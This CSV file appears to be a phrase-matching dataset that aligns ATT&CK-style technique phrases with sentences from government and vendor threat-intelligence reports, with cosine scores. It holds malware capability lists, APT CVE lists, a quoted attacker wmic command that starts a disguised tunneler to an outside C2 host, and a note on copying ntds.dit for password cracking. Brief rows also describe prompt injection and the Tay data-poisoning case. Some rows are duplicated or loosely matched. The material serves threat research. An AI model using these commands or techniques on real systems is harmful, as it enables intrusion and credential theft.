phrase,before,matching_sentence,after,report_id,rank,cosine_score
engaging with artificial intelligence (ai)engaging with artificial intelligence (ai) 2contents introduction,"our mission is to make a positive contribution to alliance’s understanding of strategic communications and to facilitate accurate, appropriate, and timely communication among its members as objectives and roles emerge and evolve in the rapidly changing information environment. www.stratcomcoe.org | @stratcomcoe | info@stratcomcoe.org",engaging with artificial intelligence (ai)engaging with artificial intelligence (ai) 2contents introduction  .,. .,66f558c63063d29485700151,681,1.0000000000000002
engaging with artificial intelligence (ai)engaging with artificial intelligence (ai) 2contents introduction,"this publication was developed by the australian signals directorate’s australian cyber security centre (asd’s acsc) in collaboration with the following international partners: • united states (us) cybersecurity and infrastructure security agency (cisa), the federal bureau of investigation (fbi) and the national security agency (nsa) • united kingdom (uk) national cyber security centre (ncsc-uk) • canadian centre for cyber security (cccs) • new zealand national cyber security centre (ncsc-nz) and cert nz • germany federal office for information security (bsi) • israel national cyber directorate (incd) • japan national center of incident readiness and strategy for cybersecurity (nisc) and the secretariat of science, technology and innovation policy, cabinet office • norway national cyber security centre (ncsc-no) • singapore cyber security agency (csa) • sweden national cybersecurity center the guidance within this publication is focused on using ai systems securely rather than developing secure ai systems. the authoring agencies encourage developers of ai systems to refer to the joint guidelines for secure ai system development.",engaging with artificial intelligence (ai) 4what is ai?,"ai is the theory and development of computer systems able to perform tasks normally requiring human intelligence, such as visual perception, speech recognition, decision-making and translation between languages. modern ai is usually built using machine learning algorithms.",66f558c63063d29485700151,899,0.7199931386344736
engaging with artificial intelligence (ai)engaging with artificial intelligence (ai) 2contents introduction,"users tweeted abusive language at tay with the intention of inserting abusive material into tay’s training data therefore poisoning the ai model when it was retrained. as a result, tay began using abusive language towards other users.",engaging with artificial intelligence (ai) 62 .,input manipulation attacks – prompt injection and adversarial examples prompt injection is an input manipulation attack that attempts to insert malicious instructions or hidden commands into an ai system. prompt injection can allow a malicious actor to hijack the ai model’s output and jailbreak the ai system.,66f558c63063d29485700151,935,0.784560554423347
engaging with artificial intelligence (ai)engaging with artificial intelligence (ai) 2contents introduction,"the terms under which the coat of arms can be used are detailed on the department of the prime minister and cabinet website (www.pmc.gov.au/government/commonwealth-coat-arms). for more information, or to report a cyber security incident, contact us: cyber.gov.au | 1300 cyber1 (1300 292 371).",engaging with artificial intelligence (ai) 15,"ir-on-man: interpretable incident inspector based on large-scale language model and association mining sian-yao huang, cheng-lin yang, chung-kuan chen #bhusa @blackhateventsoutline research motivation research problem challenge 1: syntactic problem challenge 2: semantic problem challenge 3: contextual problem from cmdgpt to ir-on-man evaluation and real world experience conclusion #bhusa @blackhatevents$whoami sian-yao ‘eric’ huang senior data scientist at publication on top machine learning conferences cvpr ijcnn research focuses: large-scale multifactorial anomaly detection automatic ad security analysis massive user behavior retrieval cycraft | cycraft | twitter website #bhusa @blackhatevents$whoami cheng-lin ‘george’ yang, phd (twitter: @clyangtw) data science director at research focuses distributed large-scale cybersecurity ml analysis platform adopting large language model to the cybersecurity industry speakers at the following conference cybersec seccon pycon taiwan pycon japan amateur ctf player cycraft | cycraft | twitter website #bhusa @blackhatevents$whoami chung-kuan ‘ck’ chen, phd (twitter: @bletchley13) security research director at retired ctf player founder of bamboofox ctf team in nctu participate defcon final 2016 and 2018 chroot member - best private hacker group in taiwan director of association of hackers in taiwan(hit), chairman of hitcon editorial committee hitcon cmt 8/18~8/19 hitcon ent 11/15 hitcon ctf 9/8~9/10 cycraft | cycraft | twitter website #bhusa @blackhateventsendless fighting against threat actors taiwan is at the forefront of cyber threats. 台 we have closely monitored numerous cyber attacks, particularly those from china.",66f558c63063d29485700151,1097,0.8024374028092529
advstoreshell compresses output data generated by command execution with a custom implementation of the lempel–ziv–welch  algorithm.,"0 2 34 number entry 1 header entry 1 entry n header entry n of entries legend 0 4 8 12 28 32 plain text data lzw compressed data magic entry size command timestamp command return status number figure 18. outbound file format. field sizes are in bytes each entry begins with a 32-byte header, containing in particular a 4-byte magic number (0xb2745daf), the command return status code, a timestamp of the command execution (in a systemtime windows structure [19]), and the actual command number.","then comes the output data generated by the command execution, compressed with a custom implementation of the lempel–ziv–welch (lzw) algorithm [20].","73en route with sednit a source code search engine allowed us to retrieve what we believe to be the c source code of the lzw algorithm implementation employed by sedreco [21]. figure 19 shows an extract of the compressed data header initialization in the source code, with the distinctive lzw!",66f559433063d29485700167,1588,0.7481101096189448
adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities.,"page 10 of 27 | product id: aa23-347a tlp:cleartlp:clear international partnership masquerading t1036 svr cyber actors use a variant that uses dll hijacking in zabbix as a means to start execution (and potentially provide long-term, hard-to- detect access) and a variant that masks itself within vcperf, an open- source c++ build analysis tool from microsoft. process injection t1055 svr cyber actors inject code into av and edr processes to evade defenses.",disable or modify tools t1562.001 svr cyber actors may modify and/or disable tools to avoid possible detection of their malware/tools and activities.,"hide artifacts t1564 svr cyber actors may attempt to hide artifacts associated with their behaviors to evade detection. hide artifacts: hidden files and t1564.001 when communicating with cloud directories services, graphicalproton generates a randomly named directory which is used to store infection-specific bmp files - with both commands and results.",66f559dc3063d29485700177,4633,0.7981759734806716
stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,"table 11: svr cyber actors att&ck techniques for enterprise: exfiltration technique title id use automated exfiltration t1020 svr cyber actors may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during collection. page 13 of 27 | product id: aa23-347a tlp:cleartlp:clear international partnership exfiltration over c2 channel t1041 svr cyber actors may steal data by exfiltrating it over an existing c2 channel.",stolen data is encoded into normal communications using the same protocol as c2 communications.,exfiltration over web service t1567 svr cyber actors use onedrive and dropbox to exfiltrate data to their c2 station. indicators of compromise note: please refer to appendix b for a list of iocs.,66f559dc3063d29485700177,4651,0.8881032501438765
"the group has previously exploited cve-2017-8570, cve-2012-1856, cve-2014-4114, cve-2017-0199, cve-2017-11882, and cve-2015-1641.","forest blizzard delivered a customer backdoor called headlace by taking advantage of the israel-hamas war. it performed the attack campaign by exploiting a winrar flaw (cve-2023-38831), targeting critical infrastructure organizations across hungary, turkey, australia, poland, belgium, ukraine, germany, azerbaijan, saudi arabia, kazakhstan, italy, latvia, and romania.","forest blizzard demonstrates a history of leveraging various software weaknesses across a wide range of years, from 2010 to 2023. the most exploited vulnerabilities by forest blizzard have been tracked as follows: cve-2017-0144, cve-2013-3897, cve-2014-1776, cve-2012-0158, cve-2015-5119, cve-2013-3906, cve-2015-7645, cve-2015-2387, cve-2010-3333, cve-2015-1641, cve-2013-1347, cve-2015-3043, cve-2015-1642, cve-2015-2590, cve-2015-1701, cve-2015-4902, cve-2017-0262, cve-2017-6742 , cve-2017-0263, cve-2014-4076, cve-2014-0515, cve-2022-30190, cve-2021-34527, cve-2021-1675, cve-2022-38028, cve-2023-23397, cve-2023-38831 www.logpoint.com 06malware timeline malware timeline forest blizzard is notorious for using custom malware, unlike some adversaries who use off-the-shelf tools.","2011-2012  sofacy (sourface): first-stage malware implant used by forest blizzard tailors their malware for specific use forest blizzard, sharing similarities with the older miniduke implants. cases.",66f559ad3063d2948570016b,2389,0.7359624496859996
"hafnium has exploited cve-2021-26855, cve-2021-26857, cve-2021-26858, and cve-2021-27065  to compromise on-premises versions of microsoft exchange server, enabling access to email accounts and installation of additional malware.","]com and openmd5 . ]com ) reported by mstic and plugx c2 infrastructure, ip address 137.220.178 . 43 .","we observed this c2 targeting mail servers in early to mid-2021, with this activity likely tied to the exploitation of 4 microsoft exchange server vulnerabilities  cve 2021 26855, cve 2021 26857, cve 2021 26858, cve 2021 27065  released in march 2021. these domains also have hosting overlaps with ip addresses observed within the identified ddns cluster.",11 cta cn 2023 0330 recordedfuture®|www.recordedfuture.comcyberthreatanalysis|china mitigations a previous insikt group report provides a comprehensive breakdown of detection and mitigation techniques related to cobalt strike. recorded future proactively detects both cobalt strike and plugx servers and are logged in the command and control security control feed.,66f559e03063d29485700178,4803,0.7218382363666338
"apt28 has exploited cve-2014-4076, cve-2015-2387, cve-2015-1701, cve-2017-0263 to escalate privileges.","forest blizzard delivered a customer backdoor called headlace by taking advantage of the israel-hamas war. it performed the attack campaign by exploiting a winrar flaw (cve-2023-38831), targeting critical infrastructure organizations across hungary, turkey, australia, poland, belgium, ukraine, germany, azerbaijan, saudi arabia, kazakhstan, italy, latvia, and romania.","forest blizzard demonstrates a history of leveraging various software weaknesses across a wide range of years, from 2010 to 2023. the most exploited vulnerabilities by forest blizzard have been tracked as follows: cve-2017-0144, cve-2013-3897, cve-2014-1776, cve-2012-0158, cve-2015-5119, cve-2013-3906, cve-2015-7645, cve-2015-2387, cve-2010-3333, cve-2015-1641, cve-2013-1347, cve-2015-3043, cve-2015-1642, cve-2015-2590, cve-2015-1701, cve-2015-4902, cve-2017-0262, cve-2017-6742 , cve-2017-0263, cve-2014-4076, cve-2014-0515, cve-2022-30190, cve-2021-34527, cve-2021-1675, cve-2022-38028, cve-2023-23397, cve-2023-38831 www.logpoint.com 06malware timeline malware timeline forest blizzard is notorious for using custom malware, unlike some adversaries who use off-the-shelf tools.","2011-2012  sofacy (sourface): first-stage malware implant used by forest blizzard tailors their malware for specific use forest blizzard, sharing similarities with the older miniduke implants. cases.",66f559ad3063d2948570016b,2389,0.7519177030093914
"geminiduke collects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's my documents, programs installed to the program files folder, and recently accessed files, folders, and programs.","the length of the data section name must be 4 bytes!” geminiduke first known activity january 2009 most recent known activity december 2012 other names n/a c&c communication methods http (s) known toolset components ◊ loader ◊ information stealer ◊ multiple persistence components the geminiduke toolset consists of a core information stealer, a loader and multiple persistence- related components. unlike cosmicduke and pinchduke, geminiduke primarily collects information on the victim computer’s configuration.","the collected details include: • local user accounts • network settings • internet proxy settings • installed drivers • running processes • programs previously executed by users • programs and services configured to automatically run at startup • values of environment variables • files and folders present in any users home folder • files and folders present in any users my documents • programs installed to the program files folder • recently accessed files, folders and programs f-secure whitepaper, september 2015 23as is common for malware, the geminiduke infostealer uses a mutex to ensure that only one instance of itself is running at a time.",what is less common is that the name used for the mutex is often a timestamp. we believe these timestamps to be generated during the compilation of geminiduke from the local time of the computer being used.,66f559d83063d29485700176,4360,0.7836515261902968
adversaries may attempt to hide artifacts associated with their behaviors to evade detection.,process injection t1055 svr cyber actors inject code into av and edr processes to evade defenses. disable or modify tools t1562.001 svr cyber actors may modify and/or disable tools to avoid possible detection of their malware/tools and activities.,hide artifacts t1564 svr cyber actors may attempt to hide artifacts associated with their behaviors to evade detection.,"hide artifacts: hidden files and t1564.001 when communicating with cloud directories services, graphicalproton generates a randomly named directory which is used to store infection-specific bmp files - with both commands and results. table 7: svr cyber actors’ att&ck techniques for enterprise: credential access technique title id use os credential dumping: lsass t1003.001 svr cyber actors executed mimikatz memory commands in memory to gain access to credentials stored in memory.",66f559dc3063d29485700177,4634,0.8012112907580574
adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.,"page 12 of 27 | product id: aa23-347a tlp:cleartlp:clear international partnership windows management t1047 svr cyber actors executed instrumentation rsockstun either in memory or using windows management instrumentation (wmi) to execute malicious commands and payloads. wmic process call create ""c:\\\\program files\\\\windows defender advanced threat protection\\\\sense.exe -connect poetpages.com -pass m554- 0sddsf2@34232fsl45t31"" table 10: svr cyber actors att&ck techniques for enterprise: command and control technique title id use dynamic resolution t1568 svr may dynamically establish connections to command-and-control infrastructure to evade common detections and remediations.",protocol tunneling t1572 svr cyber actors may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.,"in selected environments, the svr used an additional tool named, “rr.exe”—a modified open source reverse socks tunneler named rsockstunm—to establish a tunnel to the c2 infrastructure. table 11: svr cyber actors att&ck techniques for enterprise: exfiltration technique title id use automated exfiltration t1020 svr cyber actors may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during collection.",66f559dc3063d29485700177,4647,0.8463498886297561
adversaries may gather information about the victim's host software that can be used during targeting.,"for additional mitigations, see the mitigations section. table 1: svr cyber actors att&ck techniques for enterprise - reconnaissance technique title id use gather victim network svr cyber actors may gather t1046 information: network topology information about the victim’s network topology that can be used during targeting.",gather victim host information: t1592.002 svr cyber actors may gather software information about the victim’s host networks that can be used during targeting.,page 8 o f 27 | product id: aa23-347a tlp:cleartlp:clear international partnership table 2: svr cyber actors’ att&ck techniques for enterprise – initial access technique title id use exploit public-facing application t1190 svr cyber actors exploit internet- connected jetbrains teamcity server using cve-2023-42793 for initial access. table 3: svr cyber actors’ att&ck techniques for enterprise: execution techniqu id use e title comman t1059.0 svr cyber actors used powershell commands to compress microsoft sql d and 01 server .dll files.,66f559dc3063d29485700177,4620,0.715508447850562
adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities.,"page 10 of 27 | product id: aa23-347a tlp:cleartlp:clear international partnership masquerading t1036 svr cyber actors use a variant that uses dll hijacking in zabbix as a means to start execution (and potentially provide long-term, hard-to- detect access) and a variant that masks itself within vcperf, an open- source c++ build analysis tool from microsoft. process injection t1055 svr cyber actors inject code into av and edr processes to evade defenses.",disable or modify tools t1562.001 svr cyber actors may modify and/or disable tools to avoid possible detection of their malware/tools and activities.,"hide artifacts t1564 svr cyber actors may attempt to hide artifacts associated with their behaviors to evade detection. hide artifacts: hidden files and t1564.001 when communicating with cloud directories services, graphicalproton generates a randomly named directory which is used to store infection-specific bmp files - with both commands and results.",66f559dc3063d29485700177,4633,0.7981759734806716
adversaries may attempt to hide artifacts associated with their behaviors to evade detection.,process injection t1055 svr cyber actors inject code into av and edr processes to evade defenses. disable or modify tools t1562.001 svr cyber actors may modify and/or disable tools to avoid possible detection of their malware/tools and activities.,hide artifacts t1564 svr cyber actors may attempt to hide artifacts associated with their behaviors to evade detection.,"hide artifacts: hidden files and t1564.001 when communicating with cloud directories services, graphicalproton generates a randomly named directory which is used to store infection-specific bmp files - with both commands and results. table 7: svr cyber actors’ att&ck techniques for enterprise: credential access technique title id use os credential dumping: lsass t1003.001 svr cyber actors executed mimikatz memory commands in memory to gain access to credentials stored in memory.",66f559dc3063d29485700177,4634,0.8012112907580574
they have also used zero-day exploits.,"who is blind eagle? blind eagle (aka apt-c-36) is a suspected south america espionage group that has been active since at least 2018. the group is known for using a variety of sophisticated attack techniques, including custom malware, social engineering tactics, and spear-phishing attacks.",they have also been observed using exploits for zero-day vulnerabilities in their attacks.,"3apt blind eagle’s malware arsenal: technical analysis of the new attack chain first stage: javascript downloader in the first stage, a javascript downloader is used. the code below which is written in javascript uses activexobject to run powershell commands.",66f55a4d3063d29485700182,3986,0.7196413267616588
they have also used zero-day exploits.,"who is blind eagle? blind eagle (aka apt-c-36) is a suspected south america espionage group that has been active since at least 2018. the group is known for using a variety of sophisticated attack techniques, including custom malware, social engineering tactics, and spear-phishing attacks.",they have also been observed using exploits for zero-day vulnerabilities in their attacks.,"3apt blind eagle’s malware arsenal: technical analysis of the new attack chain first stage: javascript downloader in the first stage, a javascript downloader is used. the code below which is written in javascript uses activexobject to run powershell commands.",66f55a4d3063d29485700182,3986,0.7196413267616588
they have also used zero-day exploits.,"the different backdoors written by or for the group indicate a considerable investment over time. research indicates that platinum has used multiple backdoors concurrently at times, which could represent either multiple teams within the activity group performing different campaigns, or different versions of the tools being used against varying victim networks.",• zero day exploits.,"platinum has used several zero-day exploits against their victims. regardless of whether they researched the exploits themselves or purchased them from independent researchers, the monetary investment required to collect and deploy zero-day exploits at this level is considerable.",66f55a9e3063d29485700197,3452,0.8152144330550952
jpin can enumerate drives and their types.,"after it is installed and started, the jpin service can perform the following tasks, among others: • obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on. • list running services, processes, job ids, and task ids.",• enumerate drives and their types.,• enumerate registry keys. • load a custom keylogger.,66f55a9e3063d29485700197,3379,0.8271897007149128
it can also change file permissions using cacls.exe.,"• inject content into the lsass.exe process, in order to load the keylogger module into lsass and call its exported function.• communicate via ftp. • send email via smtp.",• change permissions on files using the cacls.exe command-line utility.,"jpin can also target mobile suite applications and extract data from them. the backdoor contains code that looks for installed instances of symbian, blackberry, and windows phone management applications.",66f55a9e3063d29485700197,3389,0.7077440610256507
jpin can download files and upgrade itself.,• load a custom keylogger. • download files.,• download and upgrade itself.,"• acquire network information such as dns, ip, proxies, and so on. • exfiltrate information over http get and post requests, with the data stored either within the http body or within the url parameters.",66f55a9e3063d29485700197,3383,0.7920700869235389
jpin can send email over smtp.,"• lower security settings by tampering with registry keys. • inject content into the lsass.exe process, in order to load the keylogger module into lsass and call its exported function.• communicate via ftp.",• send email via smtp.,• change permissions on files using the cacls.exe command-line utility. jpin can also target mobile suite applications and extract data from them.,66f55a9e3063d29485700197,3388,0.7072174568759437
advstoreshell can enumerate registry keys.,"• list running services, processes, job ids, and task ids. • enumerate drives and their types.",• enumerate registry keys.,• load a custom keylogger. • download files.,66f55a9e3063d29485700197,3380,0.7411477090749925
jpin can enumerate registry keys.,"• list running services, processes, job ids, and task ids. • enumerate drives and their types.",• enumerate registry keys.,• load a custom keylogger. • download files.,66f55a9e3063d29485700197,3380,0.751449817329315
carbon uses the netstat -r and netstat -an commands.,(accessed:02.02.2021). [3] microsoft.,netstat.,url : https://docs.microsoft.com/en-us/windows-server/ administration/windows-commands/netstat.(accessed:02.02.2021). [4] microsoft.,66f55a893063d29485700192,2727,0.7927614595882142
jpin can use the command-line utility cacls.exe to change file permissions.,"• inject content into the lsass.exe process, in order to load the keylogger module into lsass and call its exported function.• communicate via ftp. • send email via smtp.",• change permissions on files using the cacls.exe command-line utility.,"jpin can also target mobile suite applications and extract data from them. the backdoor contains code that looks for installed instances of symbian, blackberry, and windows phone management applications.",66f55a9e3063d29485700197,3389,0.8154106102844737
they have also used zero-day exploits.,"the different backdoors written by or for the group indicate a considerable investment over time. research indicates that platinum has used multiple backdoors concurrently at times, which could represent either multiple teams within the activity group performing different campaigns, or different versions of the tools being used against varying victim networks.",• zero day exploits.,"platinum has used several zero-day exploits against their victims. regardless of whether they researched the exploits themselves or purchased them from independent researchers, the monetary investment required to collect and deploy zero-day exploits at this level is considerable.",66f55a9e3063d29485700197,3452,0.8152144330550952
jpin can enumerate drives and their types.,"after it is installed and started, the jpin service can perform the following tasks, among others: • obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on. • list running services, processes, job ids, and task ids.",• enumerate drives and their types.,• enumerate registry keys. • load a custom keylogger.,66f55a9e3063d29485700197,3379,0.8271897007149128
jpin can download files and upgrade itself.,• load a custom keylogger. • download files.,• download and upgrade itself.,"• acquire network information such as dns, ip, proxies, and so on. • exfiltrate information over http get and post requests, with the data stored either within the http body or within the url parameters.",66f55a9e3063d29485700197,3383,0.7920700869235389
jpin can send email over smtp.,"• lower security settings by tampering with registry keys. • inject content into the lsass.exe process, in order to load the keylogger module into lsass and call its exported function.• communicate via ftp.",• send email via smtp.,• change permissions on files using the cacls.exe command-line utility. jpin can also target mobile suite applications and extract data from them.,66f55a9e3063d29485700197,3388,0.7072174568759437
adversaries may attempt to find local system groups and permission settings.,discovery the actor executed commands to gather system information discovery t1082 information about local drives. the actor gathered information about system owner/user discovery t1033 successful logons to the host using a powershell command.,permission groups discovery: the actor attempt to find local system t1069.001 local groups groups and permission settings.,permission groups discovery: the actor used commands to enumerate t1069.002 doman groups the active directory structure. system network configuration the actor used commands to enumerate t1016 discovery the network topology.,66f55adf3063d294857001a1,2786,0.7562186488446229
"-list /groups on macos, and groups on linux can list local groups.","major confounding factors in this analysis developments. overlay activity spikes in threat activity— are the use of common contractors and operational captured in internal monitoring and external reporting— resources (e.g., tooling, infrastructure) across prc threat with geopolitical activity to investigate possible causes.",groups.,"this insight can prioritize proactive hunt and  indicators and warnings: when facing a challenge, the prc defensive measures tailored to relevant groups’ tactics, typically uses multiple forms of power concurrently, since a techniques, and procedures (ttp). single policy (e.g., cyberattacks) is unlikely to have a 4factors increasing the likelihood of targeting by prc cyberattack operations this chart identifies factors that increase an organization’s likelihood of becoming the target or being impacted by a prc cyberattack, based on the case studies in this report.",66f55bfa3063d294857001a5,3466,0.7230671491568552
"by default, the ntds file  is located in %systemroot%\\ntds\\ntds.dit of a domain controller.",additional information on wmi events and tracing can be found in the references section of the advisory. ntds.dit active directory database the actor may try to exfiltrate the ntds.dit file and the system registry hive from windows domain controllers (dcs) out of the network to perform password cracking [t1003.003].,"(the ntds.dit file is the main active directory (ad) database file and, by default, is stored at %systemroot%\\\\ntds\\\\ntds.dit.","this file contains information about users, groups, group memberships, and password hashes for all users in the domain; the system registry hive contains the boot key that is used to encrypt information in the ntds.dit file.) although the ntds.dit file is locked while in use by ad, a copy can be made by creating a volume shadow copy and extracting the ntds.dit file from the shadow copy.",66f55adf3063d294857001a1,2637,0.777696148704137
"apt29 has exploited cve-2019-19781 for citrix, cve-2019-11510 for pulse secure vpns, cve-2018-13379 for fortigate vpns, and cve-2019-9670 in zimbra software to gain access.","in recent attacks targeting covid-19 vaccine research and development, the group conducted basic vulnerability scanning against specific external ip addresses owned by the organisations. the group then deployed public exploits against the vulnerable services identified.the group has been successful using recently published exploits to gain initial footholds.","examples include, but are not limited to: • cve-2019-19781 citrix [1] • cve-2019-11510 pulse secure [2] • cve-2018-13379 fortigate [2] • cve-2019-9670 zimbra [3] the group likely seeks to take full advantage of a variety of new exploits when publicised.","more information about these exploits can be found in previous ncsc advisories on citrix and vpn vulnerabilities [1,2]. the group also uses spear-phishing to obtain authentication credentials to internet- accessible login pages for target organisations.",66f55ca63063d294857001b6,4786,0.7638036833118754
"for example, this may be used to forge saml tokens, without the need to compromise the signing certificate to forge new credentials.","for example, each cloud once apt29 had gained on-premises access to an organization’s application can define a token-decrypting certificate, which is environment, mandiant observed them targeting on-premises used to encrypt the saml token as it is transmitted to the cloud ad fs servers with the goal of obtaining the token-signing resource. this option is not widely used.",certificate to forge saml tokens.,"there are two steps an note: if an ad fs server farm model is leveraged, the same token- attacker must take to obtain the token-signing certificate and signing and decryption certificates are used by all the ad fs servers. private key.",66f55d6e3063d294857001c8,4532,0.7075203579961225
adversaries may also assign mailbox folder permissions through individual folder permissions or roles.,mailbox folder permissions are frequently used to share a specific folder within a mailbox with a co-worker instead of delegating rights for the entire mailbox. administrators will often make a calendar public by granting read access to it for all authenticated users.,"mailbox folder permissions can be assigned through either individual folder permissions or roles, which are a collection of folder permissions.",the readitems permission grants read access to the items in a mailbox folder. the following roles include permissions that grant read access to folder items: • author • editor • noneditingauthor • owner • publishingeditor • publishingauthor • reviewer for a full listing of mailbox folder permissions and roles see https://docs.microsoft.com/en-us/powershell/module/ exchange/set-mailboxfolderpermission?view=exchange- ps#parameters.,66f55d6e3063d294857001c8,4774,0.7757896486416247
the different components of machete are executed by windows task scheduler.,initial access spearphishing t1193 emails contain a zipped file with malicious contents. attachment tries to get users to open links or attachments t1204 user execution that will execute the first component of machete.,execution other components of machete are executed t1053 scheduled task by windows task scheduler.,hidden files and t1158 malware files and folders are hidden for persistence. directories persistence all of the components are scheduled to ensure t1053 scheduled task persistence.,66f55da13063d294857001d2,2803,0.7307131977405948
darkcomet can steal data from the clipboard.,• list folders and files. • upload/download files.,• steal clipboard data.,"• grab/change wallpaper. in recent infections, this rat is named “cyrus client” (figure 16).",66f55e453063d294857001ee,4668,0.744149189521626
rtm can capture screenshots.,allakore allakore is a publicly available delphi- based rat that has consistently been used in sidecopy operations along with cetarat. malicious capabilities of allakore include: • keylogging.,• capture screenshots.,• list folders and files. • upload/download files.,66f55e453063d294857001ee,4665,0.7529826647119054
redleaves can capture screenshots.,allakore allakore is a publicly available delphi- based rat that has consistently been used in sidecopy operations along with cetarat. malicious capabilities of allakore include: • keylogging.,• capture screenshots.,• list folders and files. • upload/download files.,66f55e453063d294857001ee,4665,0.7140177172034063
zxshell can capture screenshots.,allakore allakore is a publicly available delphi- based rat that has consistently been used in sidecopy operations along with cetarat. malicious capabilities of allakore include: • keylogging.,• capture screenshots.,• list folders and files. • upload/download files.,66f55e453063d294857001ee,4665,0.731401070366259
darkcomet can steal data from the clipboard.,• list folders and files. • upload/download files.,• steal clipboard data.,"• grab/change wallpaper. in recent infections, this rat is named “cyrus client” (figure 16).",66f55e453063d294857001ee,4668,0.744149189521626
rtm can capture screenshots.,allakore allakore is a publicly available delphi- based rat that has consistently been used in sidecopy operations along with cetarat. malicious capabilities of allakore include: • keylogging.,• capture screenshots.,• list folders and files. • upload/download files.,66f55e453063d294857001ee,4665,0.7529826647119054
adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may log user keystrokes to intercept credentials as keylogging t1056.001 the user types them. adversaries may abuse powershell commands and scripts for powershell t1059.001 execution.,adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,66f55ee03063d294857001f7,4490,0.8452079352210665
adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may abuse powershell commands and scripts for powershell t1059.001 execution. adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic.,66f55ee03063d294857001f7,4491,0.8131930976610504
adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic. page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration.,66f55ee03063d294857001f7,4492,0.7380256398118952
adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic.,"page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration. adversaries may obtain and abuse credentials of existing valid accounts t1078 accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",66f55ee03063d294857001f7,4493,0.7051182804367757
an adversary may compress and/or encrypt data that is collected prior to exfiltration.,adversaries may execute their own malicious payloads by dynamic linker hijacking t1547.006 hijacking environment variables the dynamic linker uses to load shared libraries. inter-process adversaries may abuse inter-process communication (ipc) t1559 communication mechanisms for local code or command execution.,an adversary may compress and/or encrypt data that is collected archive collected data t1560.003 prior to exfiltration.,adversaries may attempt to hide artifacts associated with their hide artifacts t1564 behaviors to evade detection. adversaries may abuse the windows service control manager to service execution t1569.002 execute malicious commands or payloads.,66f55ee03063d294857001f7,4512,0.7722665738621782
adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may transfer tools or other files between systems in lateral tool transfer t1570 a compromised environment. adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid protocol tunneling t1572 detection/network filtering and/or enable access to otherwise unreachable systems.,adversaries may employ a known encryption algorithm to conceal encrypted channel t1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known symmetric encryption algorithm symmetric cryptography t1573.001 to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than asymmetric cryptography t1573.002 relying on any inherent protections provided by a communication protocol.,66f55ee03063d294857001f7,4517,0.8803968557719752
adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid protocol tunneling t1572 detection/network filtering and/or enable access to otherwise unreachable systems. adversaries may employ a known encryption algorithm to conceal encrypted channel t1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known symmetric encryption algorithm symmetric cryptography t1573.001 to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than asymmetric cryptography t1573.002 relying on any inherent protections provided by a communication protocol. adversaries may execute their own malicious payloads by side- dll side-loading t1574.002 loading dlls.,66f55ee03063d294857001f7,4518,0.746680986004003
